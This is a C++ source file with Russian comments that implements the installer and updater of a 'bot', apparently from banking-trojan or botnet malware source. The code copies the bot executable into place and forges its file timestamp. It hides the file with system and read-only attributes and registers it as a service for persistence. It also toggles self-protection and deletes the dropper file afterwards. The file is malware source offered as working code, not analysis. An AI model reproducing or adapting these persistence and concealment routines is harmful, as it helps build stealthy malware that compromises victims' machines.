
//****************************************************************************
//  Installer.cpp
//
//  Модуль реализации методов инсталяции бота
//
//  ВерсияЖ 1.0
//  Модифицирован: ноябрь 2012
//****************************************************************************

#include <ShlObj.h>
#include "BotCore.h"
#include "StrConsts.h"
#include "BotClasses.h"
#include "BotUtils.h"

//---------------------------------------------------------------------------
#include "BotDebug.h"

namespace INSTALLERDEBUGSTRINGS
{
	#include "DbgTemplates.h"
}

// Объявляем шаблон вывода отладочных строк
#define INSTDBG INSTALLERDEBUGSTRINGS::DBGOutMessage<>

//---------------------------------------------------------------------------


//----------------------------------------------------
//  Install - Функция инсталирует бота
//
//  IsUpdate - Признак того, что идёт обновление бота
//             а не первая инсталяция
//----------------------------------------------------
bool BOT::Install(const char* FileName, bool IsUpdate)
{
	if (!File::IsExists((PCHAR)FileName))
		return false;


	string BotFile = GetBotFullExeName();

	// Проверяем не пытаемся ли мы запустить инсталяцию из
	// самого себя
	if (StrSame((PCHAR)FileName, BotFile.t_str(), false, 0))
		return false;

	INSTDBG("Installer", "Инсталируем бот. Exe бота %s", BotFile.t_str());

	// Снимаем защиту и удаляем файл
	if (IsUpdate) Unprotect();
	DeleteBotFile(BotFile.t_str(), INFINITE, false);

	//  Копируем файл
	BOOL Result = (BOOL)pCopyFileA(FileName, BotFile.t_str(), TRUE);
	INSTDBG("Installer", "Копируем файл бота. [Result=%d; Err=%d]", Result, pGetLastError());

	if (Result)
	{
		// Устанавливаем дату и атрибуты файла
		SetFakeFileDateTime(BotFile.t_str());
		pSetFileAttributesA(BotFile.t_str(), FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY );
    }


	// Инсталируем сервис
	if (IsUpdate)
	{
		// Обновляем сервис
		// В случае неудачи пытаемся установить сервис заново
		if (!UpdateService(FileName))
			InstallService(FileName);
	}
	else
		InstallService(FileName);


	// Ставим защиту на ехе бота
	if (IsUpdate) Protect(NULL);

	// Удаляем файл источник
	pDeleteFileA(FileName);

	if (Result)
		INSTDBG("Installer", "Бот успешно установлен");
	else
		INSTDBG("Installer", "Ошибка установки бота");

	return Result != FALSE;
}
//----------------------------------------------------------------------------

//----------------------------------------------------
//  MakeUpdate - функция обновляет бота
//----------------------------------------------------
bool BOT::MakeUpdate(const char *FileName, bool ResetSettings)
{
	// При необходимости удалем сохранённые настройки
	if (ResetSettings)
		DeleteSettings();

	return Install(FileName, true);
}
